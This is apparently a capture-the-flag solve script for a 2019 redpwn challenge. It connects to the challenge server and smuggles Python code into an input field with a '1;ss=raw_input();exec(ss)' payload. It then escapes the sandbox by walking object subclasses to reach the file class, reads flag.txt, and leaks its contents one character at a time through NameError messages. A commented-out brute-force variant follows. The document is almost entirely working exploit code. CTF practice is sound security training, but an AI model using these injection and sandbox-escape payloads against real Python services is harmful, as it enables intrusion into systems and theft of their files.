from ptrlib import *
import string
import re

table = string.printable[:-6]

sock = Socket("chall2.2019.redpwn.net", 6007)
sock.recvline()

# f = open("flag.txt")
sock.sendline("1;ss=raw_input();exec(ss)")
sock.recvline()
sock.sendline("ff = (tt for tt in (42).__class__.__base__.__subclasses__() if tt.__name__ == 'file').next()('flag.txt')")

# a = f.read()
sock.sendline("1;ss=raw_input();exec(ss)")
sock.recvline()
sock.sendline("aa = ff.read()")

# search
flag = ""
for i in range(0x40):
    sock.sendline("1;ss=raw_input();exec(ss)")
    sock.recvline()
    sock.sendline("exec('var_' + str(ord(aa[{}])))".format(i))
    c = re.findall(b"name 'var_(\d+)' is not defined", sock.recvline())[0]
    flag += chr(int(c))
    print(flag)

sock.interactive()

"""
flag = ""
for i in range(0x40):
    for c in table:
        sock.sendline("1;s=raw_input();exec(s)")
        sock.recvline()
        sock.sendline("print(y if a[{}] == '{}' else x)".format(i, c))
        if b"name 'y' is not defined" in sock.recvline():
            flag += c
            break
    print(flag)
"""
